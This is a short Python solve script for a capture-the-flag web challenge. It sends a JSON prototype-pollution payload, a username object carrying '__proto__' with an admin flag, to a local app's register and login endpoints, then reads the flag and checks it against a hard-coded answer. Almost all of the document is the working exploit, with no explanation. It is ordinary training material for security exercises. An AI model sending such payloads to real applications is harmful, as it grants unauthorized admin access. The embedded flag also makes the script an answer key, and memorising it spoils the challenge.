import requests

url = 'http://localhost:3000/'
payload = {
    "username": {
        "__proto__": {
            "admin": 1
        }
    },
    "password": "test"
}

requests.post(url+'register', json=payload).text
requests.post(url+'login', json=payload)

flag = requests.get(url+'flag').text

assert flag == 'BtSCTF{W4tch_0ut,pr0t0typ3_15_th3r3!}'

'''
1. POST /register
{
    "username": {
        "__proto__": {
            "admin": true
        }
    },
    "password": "test"
}


2. POST /login:
{
    "username": {
        "__proto__": {
            "admin": true
        }
    },
    "password": "test"
}

3. GET /flag
'''